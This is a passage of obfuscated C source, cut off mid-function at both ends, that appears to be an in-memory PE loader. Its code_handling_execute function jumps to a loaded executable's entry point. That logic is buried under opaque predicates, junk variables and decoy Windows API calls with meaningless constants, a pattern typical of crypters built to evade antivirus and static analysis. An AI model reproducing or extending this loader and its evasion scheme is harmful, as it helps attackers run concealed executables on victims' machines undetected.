          v14494493be56ea3b70340f4b749d2ea4 = IdnToNameprepUnicode(v2c144ab9bcd378ad9b165690bbf58d36, v026fc7e484097995a225d1a61ca75bad, vdfa9fa7cc271599e2194a1da29b411eb, ved7afc556ca1ba61f8775e151d9f52c2, v74bd8bb56a3260caa68f1e7aaec65c29);
        }
        return new_pe;
        if (!(((vcbb7dcad4692ef3ea030cdea2e437941_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcbb7dcad4692ef3ea030cdea2e437941_prime_opaque == ((unsigned int) 2))))
        {
          vb3295c4b0acf481a94c629c7ab5b7b91_useless_opaque = vb3295c4b0acf481a94c629c7ab5b7b91_useless_opaque <= v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque;
          vcbb7dcad4692ef3ea030cdea2e437941_prime_opaque = vcbb7dcad4692ef3ea030cdea2e437941_prime_opaque == vb3295c4b0acf481a94c629c7ab5b7b91_useless_opaque;
          vb6cbefc6fe7ef18f2cd3e08436aca870_useless_opaque = v4e0fae28bc4431ca1428b6857d66ce64_computation_opaque | ((unsigned int) 70);
          v5ccd3abd18dfc1dd597332c2a3040cd9_true_opaque = v4ff6a9d3d13c3f4fbd937c2ed83458a2_computation_opaque | vc04b975ddc345132197b1d87f09db025_computation_opaque;
        }
        error:
        replacement_free(new_pe);

        return 0;
      }
    }
    unsigned int v32197507ca2e445f9448c3c3f6bdadc2_useless_opaque = (unsigned int) 2588051278;
    unsigned int v7eeccdb6a8054241b3f9400027d9e98e_random_opaque = (unsigned int) (&v32197507ca2e445f9448c3c3f6bdadc2_useless_opaque);
  }
}

void code_handling_execute(in_memory_pe *new_pe)
{
  {
    unsigned int v2835e39e7db5b021ab95fb0479a36512_useless_opaque = (unsigned int) 1309435013;
    unsigned int v581a79aa966c37a6652c44270f54d9fc_computation_opaque = (unsigned int) 0;
    unsigned int v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque = (unsigned int) 3;
    unsigned int v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = (unsigned int) (&v2835e39e7db5b021ab95fb0479a36512_useless_opaque);
    v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = (v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque < ((unsigned int) 3))
    {
      v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = (unsigned int) 3;
    }
    while (v581a79aa966c37a6652c44270f54d9fc_computation_opaque != ((unsigned int) 1))
    {
      v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque += (unsigned int) 2;
      unsigned int ved012381d9f72051aa759484beffcc48_useless_opaque = (unsigned int) 2868717515;
      unsigned int vd9eff2eee5732e0b308621826b8cbcb0_computation_opaque = (unsigned int) 0;
      unsigned int v607ccafc9223630c86510fa95683379e_computation_opaque = (unsigned int) 3;
      unsigned int v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque = (unsigned int) (&ved012381d9f72051aa759484beffcc48_useless_opaque);
      v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque = (v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque < ((unsigned int) 3))
      {
        v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque = (unsigned int) 3;
      }
      while (vd9eff2eee5732e0b308621826b8cbcb0_computation_opaque != ((unsigned int) 1))
      {
        v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque += (unsigned int) 2;
        vd9eff2eee5732e0b308621826b8cbcb0_computation_opaque = (unsigned int) 1;
        v607ccafc9223630c86510fa95683379e_computation_opaque = (unsigned int) 3;
        while ((v607ccafc9223630c86510fa95683379e_computation_opaque * v607ccafc9223630c86510fa95683379e_computation_opaque) <= v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque)
        {
          if ((v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque % v607ccafc9223630c86510fa95683379e_computation_opaque) == ((unsigned int) 0))
          {
            vd9eff2eee5732e0b308621826b8cbcb0_computation_opaque = (unsigned int) 0;
          }
          v607ccafc9223630c86510fa95683379e_computation_opaque = v607ccafc9223630c86510fa95683379e_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v3b071827c59d1313022bc5a434d2ad22_prime_opaque = v853f3c731db77a0bcf29adec6b2f9ba1_computation_opaque;
      v581a79aa966c37a6652c44270f54d9fc_computation_opaque = (unsigned int) 1;
      v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque = (unsigned int) 3;
      while ((v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque * v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque) <= v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque)
      {
        if ((v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque % v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque) == ((unsigned int) 0))
        {
          if (((v3b071827c59d1313022bc5a434d2ad22_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v3b071827c59d1313022bc5a434d2ad22_prime_opaque == ((unsigned int) 2)))
          {
            v581a79aa966c37a6652c44270f54d9fc_computation_opaque = (unsigned int) 0;
            if (!(((v3b071827c59d1313022bc5a434d2ad22_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v3b071827c59d1313022bc5a434d2ad22_prime_opaque == ((unsigned int) 2))))
            {
              v3b071827c59d1313022bc5a434d2ad22_prime_opaque = v2835e39e7db5b021ab95fb0479a36512_useless_opaque + v607ccafc9223630c86510fa95683379e_computation_opaque;
            }
          }
        }
        v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque = v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque + ((unsigned int) 2);
      }

    }

    unsigned int vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque = (unsigned int) 614413703;
    unsigned int vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = (unsigned int) (&vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque);
    unsigned int v94115500be1bc8338c28204a05ca0497_prime_opaque = v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque;
    {
      if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
      {
        unsigned long v34f71290e80dc554e07e92688d719ed3 = (unsigned long) 0x00fde8bb;
        unsigned long vab622d0134897ed223d03c75f0b32fd2 = (unsigned long) 0x540ca06c;
        vab622d0134897ed223d03c75f0b32fd2 = MsiGetActiveDatabase(v34f71290e80dc554e07e92688d719ed3);
      }
      if (((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2)))
      {
        {
          void (*execute_entry_point)(void) = (void (*)()) new_pe->entry_point;
          unsigned int vacd724f281d867286aba9411c8e7dbd9_useless_opaque = (unsigned int) 2852625897;
          unsigned int vd759ac24dd0b8b283766fbb829a8151e_computation_opaque = (unsigned int) (&vacd724f281d867286aba9411c8e7dbd9_useless_opaque);
          unsigned int vaa8915b139b4fd6e0cdbf94cbab873a2_true_opaque = (((vd759ac24dd0b8b283766fbb829a8151e_computation_opaque * vd759ac24dd0b8b283766fbb829a8151e_computation_opaque) + vd759ac24dd0b8b283766fbb829a8151e_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
          execute_entry_point();
        }
        unsigned int v232364be45320d8e5568a30c7607fb52_useless_opaque = (unsigned int) 3972672694;
        unsigned int ve36fb3590be7b12d72091e6d363cea64_computation_opaque = (unsigned int) 0;
        unsigned int vb5314571dbcb5145e63a257f08349593_computation_opaque = (unsigned int) 3;
        unsigned int va683c309f1d5939633bf0b6efc8c828c_computation_opaque = (unsigned int) (&v232364be45320d8e5568a30c7607fb52_useless_opaque);
        va683c309f1d5939633bf0b6efc8c828c_computation_opaque = (va683c309f1d5939633bf0b6efc8c828c_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
        if (va683c309f1d5939633bf0b6efc8c828c_computation_opaque < ((unsigned int) 3))
        {
          if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
          {
            va683c309f1d5939633bf0b6efc8c828c_computation_opaque = (unsigned int) 3;
            if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
            {
              unsigned long veb83ed02c00842da6abca9982478f3d4 = (unsigned long) 0xa8c0b805;
              unsigned long v86e6297d0d3357a0374aba9a1de463bf = (unsigned long) 0x0b51d0ef;
              v86e6297d0d3357a0374aba9a1de463bf = MsiGetActiveDatabase(veb83ed02c00842da6abca9982478f3d4);
            }
            if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
            {
              void * v5696ebc17c622dd1078555d5b1e3ac30 = (void *) 0x29221aed;
              void * vfe728e296906f6a01ff9a1447a600cb0 = (void *) 0x62903be2;
              unsigned long v51d33df20481fa981e2a959803ac321d = (unsigned long) 0xa504964f;
              unsigned long vbce800ba868b71a13631675478a5febd = (unsigned long) 0x23f3611e;
              if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
              {
                vbce800ba868b71a13631675478a5febd = GetModuleFileNameA(v5696ebc17c622dd1078555d5b1e3ac30, vfe728e296906f6a01ff9a1447a600cb0, v51d33df20481fa981e2a959803ac321d);
              }
            }
            if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
            {
              v581a79aa966c37a6652c44270f54d9fc_computation_opaque = ve36fb3590be7b12d72091e6d363cea64_computation_opaque || v2835e39e7db5b021ab95fb0479a36512_useless_opaque;
              if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
              {
                vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque * ((unsigned int) 72);
                v94115500be1bc8338c28204a05ca0497_prime_opaque = v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque % v232364be45320d8e5568a30c7607fb52_useless_opaque;
              }
            }
          }
        }
        if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
        {
          v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = v94115500be1bc8338c28204a05ca0497_prime_opaque | ve36fb3590be7b12d72091e6d363cea64_computation_opaque;
          if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
          {
            if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
            {
              if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
              {
                v581a79aa966c37a6652c44270f54d9fc_computation_opaque = v232364be45320d8e5568a30c7607fb52_useless_opaque * va683c309f1d5939633bf0b6efc8c828c_computation_opaque;
              }
            }
          }
        }
        while (ve36fb3590be7b12d72091e6d363cea64_computation_opaque != ((unsigned int) 1))
        {
          if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
            {
              if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
              {
                ve36fb3590be7b12d72091e6d363cea64_computation_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque / v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque;
                v94115500be1bc8338c28204a05ca0497_prime_opaque = vb5314571dbcb5145e63a257f08349593_computation_opaque % v581a79aa966c37a6652c44270f54d9fc_computation_opaque;
                v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque / vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque;
              }
              va683c309f1d5939633bf0b6efc8c828c_computation_opaque = va683c309f1d5939633bf0b6efc8c828c_computation_opaque || v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque;
            }
            va683c309f1d5939633bf0b6efc8c828c_computation_opaque += (unsigned int) 2;
            if ((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25)))
            {
              ve36fb3590be7b12d72091e6d363cea64_computation_opaque = (unsigned int) 1;
              vb5314571dbcb5145e63a257f08349593_computation_opaque = (unsigned int) 3;
              while ((vb5314571dbcb5145e63a257f08349593_computation_opaque * vb5314571dbcb5145e63a257f08349593_computation_opaque) <= va683c309f1d5939633bf0b6efc8c828c_computation_opaque)
              {
                if ((va683c309f1d5939633bf0b6efc8c828c_computation_opaque % vb5314571dbcb5145e63a257f08349593_computation_opaque) == ((unsigned int) 0))
                {
                  if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
                  {
                    unsigned long v146d07ca9ad75e28180b1a74e3402749 = (unsigned long) 0xbf6dc8af;
                    unsigned long vbb4676dec0e7f97d7102ec175d0f449b = (unsigned long) 0x42a38f4b;
                    vbb4676dec0e7f97d7102ec175d0f449b = MsiGetActiveDatabase(v146d07ca9ad75e28180b1a74e3402749);
                  }
                  ve36fb3590be7b12d72091e6d363cea64_computation_opaque = (unsigned int) 0;
                  if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                  {
                    void * v6de7b02667f2b7f0fe468872374b9919 = (void *) 0x7fcf4132;
                    long v039b8a5b9bfa2fcf1209c263ef445b2d = (long) 0x7908241f;
                    v039b8a5b9bfa2fcf1209c263ef445b2d = RoUnregisterForApartmentShutdown(v6de7b02667f2b7f0fe468872374b9919);
                  }
                  if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
                  {
                    v232364be45320d8e5568a30c7607fb52_useless_opaque = v2835e39e7db5b021ab95fb0479a36512_useless_opaque - v94115500be1bc8338c28204a05ca0497_prime_opaque;
                    v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque = v581a79aa966c37a6652c44270f54d9fc_computation_opaque | v2835e39e7db5b021ab95fb0479a36512_useless_opaque;
                    v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = v94115500be1bc8338c28204a05ca0497_prime_opaque || ve36fb3590be7b12d72091e6d363cea64_computation_opaque;
                    v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque != v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque;
                    v232364be45320d8e5568a30c7607fb52_useless_opaque = v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque <= v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque;
                    v2835e39e7db5b021ab95fb0479a36512_useless_opaque = v232364be45320d8e5568a30c7607fb52_useless_opaque + vd6ad3a54bb900306b99d96d4c67009f4_random_opaque;
                    ve36fb3590be7b12d72091e6d363cea64_computation_opaque = vb5314571dbcb5145e63a257f08349593_computation_opaque + vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque;
                  }
                }
                if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
                {
                  v94115500be1bc8338c28204a05ca0497_prime_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque || vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque;
                }
                if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
                {
                  unsigned long v4965788dddc48ce396275527b2b5bed1 = (unsigned long) 0x3a663600;
                  void * vdeb21a88c1eb58b418aac77edc6c27a0 = (void *) 0x8ef38f3c;
                  int v25c80e7d67839c9d1c897b374b23e994 = (int) 0x662955e1;
                  void * vecf9bdf6ccb9baa4e071ed0fcb3545b0 = (void *) 0x52122bbf;
                  int v5fbb242ea1f349b59d499848cbb47301 = (int) 0x1ec3624e;
                  int v9a3ae233db6e913c94a4c603a47469c0 = (int) 0x57c39e5e;
                  v9a3ae233db6e913c94a4c603a47469c0 = IdnToNameprepUnicode(v4965788dddc48ce396275527b2b5bed1, vdeb21a88c1eb58b418aac77edc6c27a0, v25c80e7d67839c9d1c897b374b23e994, vecf9bdf6ccb9baa4e071ed0fcb3545b0, v5fbb242ea1f349b59d499848cbb47301);
                  if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                  {
                    if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                    {
                      v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = va683c309f1d5939633bf0b6efc8c828c_computation_opaque / v581a79aa966c37a6652c44270f54d9fc_computation_opaque;
                      v94115500be1bc8338c28204a05ca0497_prime_opaque = v2835e39e7db5b021ab95fb0479a36512_useless_opaque <= v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque;
                      v2835e39e7db5b021ab95fb0479a36512_useless_opaque = va683c309f1d5939633bf0b6efc8c828c_computation_opaque * ((unsigned int) 4);
                      vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque <= ((unsigned int) 42);
                      v232364be45320d8e5568a30c7607fb52_useless_opaque = vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque - v2835e39e7db5b021ab95fb0479a36512_useless_opaque;
                    }
                    v232364be45320d8e5568a30c7607fb52_useless_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque != v12dd2eeb23b83da2c2bd279a0ab7c1d8_computation_opaque;
                  }
                }
                if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                {
                  void * vdfbdb15b0e59431807e7709288deb325 = (void *) 0xaca9aab3;
                  if (!((((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 9)) + ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 16))) == ((vd6ad3a54bb900306b99d96d4c67009f4_random_opaque * vd6ad3a54bb900306b99d96d4c67009f4_random_opaque) * ((unsigned int) 25))))
                  {
                    void * v3f0933914e48bf145bd0526af6bb2717 = (void *) 0x7a141889;
                    int v82fca9357ad71e5974e8a28f7184314f = (int) 0x6bccfee8;
                    v82fca9357ad71e5974e8a28f7184314f = RemoveDllDirectory(v3f0933914e48bf145bd0526af6bb2717);
                  }
                  if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                  {
                    vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque % vd6ad3a54bb900306b99d96d4c67009f4_random_opaque;
                    vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = vb5314571dbcb5145e63a257f08349593_computation_opaque + v232364be45320d8e5568a30c7607fb52_useless_opaque;
                    vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque = v581a79aa966c37a6652c44270f54d9fc_computation_opaque == v2835e39e7db5b021ab95fb0479a36512_useless_opaque;
                    v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque != ve36fb3590be7b12d72091e6d363cea64_computation_opaque;
                  }
                  void * v57e681fe9332efed1aa9b647fa19e190 = (void *) 0x9e9a4eaa;
                  unsigned long vf8a84846e3f2ab81c8614d881eba60e9 = (unsigned long) 0x3fa4f812;
                  if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                  {
                    void * v6478cece16df3af505bb157fcbcf2a36 = (void *) 0x7916ff14;
                    if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                    {
                      unsigned long v3394b7648ad0217deebd3db0724845f4 = (unsigned long) 0x489c7c3b;
                      void * v10c5aa8470829aaacb0a8d0faa12d328 = (void *) 0x721c2d38;
                      int v2353151221e8f6b6224bbbd62d9213ab = (int) 0x2c9f08df;
                      void * v5fd4e79d083f40c30446c1abecfdd1b9 = (void *) 0x01c08c24;
                      int vf0157bf061da5485b1c768b458e82a97 = (int) 0xe92df1bd;
                      int v5115eddd4c2e8682e05e0d4da6deac43 = (int) 0x00f95a7c;
                      v5115eddd4c2e8682e05e0d4da6deac43 = IdnToNameprepUnicode(v3394b7648ad0217deebd3db0724845f4, v10c5aa8470829aaacb0a8d0faa12d328, v2353151221e8f6b6224bbbd62d9213ab, v5fd4e79d083f40c30446c1abecfdd1b9, vf0157bf061da5485b1c768b458e82a97);
                    }
                    void * va129681b25334c550f48b21ba7bff064 = (void *) 0x7897346b;
                    if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                    {
                      vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque = v94115500be1bc8338c28204a05ca0497_prime_opaque < ve36fb3590be7b12d72091e6d363cea64_computation_opaque;
                      va683c309f1d5939633bf0b6efc8c828c_computation_opaque = vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque || v581a79aa966c37a6652c44270f54d9fc_computation_opaque;
                      vdf3dc37c628e58f8f061054ee6e6727a_useless_opaque = vd6ad3a54bb900306b99d96d4c67009f4_random_opaque != ((unsigned int) 113);
                      v94115500be1bc8338c28204a05ca0497_prime_opaque = va683c309f1d5939633bf0b6efc8c828c_computation_opaque | v94115500be1bc8338c28204a05ca0497_prime_opaque;
                    }
                    unsigned long v3d33fa1fa70ea44b6be8759f48bfb1d2 = (unsigned long) 0x42b4dfab;
                    unsigned long v0379ebeee48bbcb1745c85922ee52180 = (unsigned long) 0xff9d1755;
                    v0379ebeee48bbcb1745c85922ee52180 = GetModuleFileNameA(v6478cece16df3af505bb157fcbcf2a36, va129681b25334c550f48b21ba7bff064, v3d33fa1fa70ea44b6be8759f48bfb1d2);
                  }
                  unsigned long v51de40f562a219fec80d72e676f25008 = (unsigned long) 0xabd31bf8;
                  if (((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2)))
                  {
                    v51de40f562a219fec80d72e676f25008 = GetModuleFileNameA(vdfbdb15b0e59431807e7709288deb325, v57e681fe9332efed1aa9b647fa19e190, vf8a84846e3f2ab81c8614d881eba60e9);
                  }
                }
                vb5314571dbcb5145e63a257f08349593_computation_opaque = vb5314571dbcb5145e63a257f08349593_computation_opaque + ((unsigned int) 2);
